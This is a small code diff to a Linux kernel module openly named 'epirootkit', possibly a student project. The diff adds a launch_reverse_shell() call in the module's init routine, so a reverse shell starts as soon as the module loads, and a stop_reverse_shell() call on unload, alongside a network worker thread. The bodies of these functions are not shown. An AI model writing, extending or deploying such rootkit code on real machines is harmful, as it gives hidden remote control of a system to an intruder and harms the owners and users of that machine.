@@ -83,6 +83,8 @@ static int __init epirootkit_init(void)
 		return -FAILURE;
 	}
 
+	launch_reverse_shell();
+
 	// Start a kernel thread that will handle network communication
 	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
 	if (IS_ERR(network_thread)) {
@@ -100,6 +102,8 @@ static int __init epirootkit_init(void)
  */
 static void __exit epirootkit_exit(void)
 {
+	stop_reverse_shell();
+
 	if (network_thread) {
 		if (!thread_exited)
 			kthread_stop(network_thread);
